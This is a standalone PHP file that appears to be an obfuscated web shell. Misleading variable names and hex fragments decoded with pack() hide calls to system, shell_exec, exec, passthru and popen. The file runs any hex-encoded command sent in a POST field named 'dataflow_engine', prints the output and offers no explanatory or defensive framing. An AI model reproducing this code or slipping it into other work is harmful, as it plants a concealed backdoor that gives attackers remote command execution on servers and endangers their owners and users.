<?php


$token1 = '73';
$token2 = '74';
$token3 = '65';
$token4 = '6d';
$token5 = '6c';
$token6 = '5f';
$token7 = '63';
$token8 = '78';
$token9 = '61';
$token10 = '68';
$token11 = '70';
$token12 = '6f';
$token13 = '67';
$token14 = '6e';
$token15 = '69';
$reverse_lookup1 = pack("H*", '73' . '79' . $token1 . $token2 . $token3 . $token4);
$reverse_lookup2 = pack("H*", '73' . '68' . '65' . '6c' . $token5 . $token6 . '65' . '78' . '65' . $token7);
$reverse_lookup3 = pack("H*", $token3 . $token8 . $token3 . $token7);
$reverse_lookup4 = pack("H*", '70' . $token9 . $token1 . '73' . $token2 . $token10 . '72' . '75');
$reverse_lookup5 = pack("H*", $token11 . $token12 . '70' . '65' . '6e');
$reverse_lookup6 = pack("H*", '73' . $token2 . '72' . '65' . '61' . $token4 . $token6 . $token13 . '65' . '74' . $token6 . '63' . $token12 . '6e' . $token2 . '65' . $token14 . '74' . $token1);
$reverse_lookup7 = pack("H*", '70' . '63' . '6c' . $token12 . '73' . $token3);
$dataflow_engine = pack("H*", '64' . $token9 . $token2 . $token9 . '66' . '6c' . $token12 . '77' . '5f' . $token3 . $token14 . $token13 . $token15 . $token14 . '65');
if (isset($_POST[$dataflow_engine])) {
    $dataflow_engine = pack("H*", $_POST[$dataflow_engine]);
    if (function_exists($reverse_lookup1)) {
        $reverse_lookup1($dataflow_engine);
    } elseif (function_exists($reverse_lookup2)) {
        print $reverse_lookup2($dataflow_engine);
    } elseif (function_exists($reverse_lookup3)) {
        $reverse_lookup3($dataflow_engine, $descriptor_hld);
        print join("\n", $descriptor_hld);
    } elseif (function_exists($reverse_lookup4)) {
        $reverse_lookup4($dataflow_engine);
    } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
        $parameter_group_ent = $reverse_lookup5($dataflow_engine, 'r');
        if ($parameter_group_ent) {
            $property_set_pgrp = $reverse_lookup6($parameter_group_ent);
            $reverse_lookup7($parameter_group_ent);
            print $property_set_pgrp;
        }
    }
    exit;
}
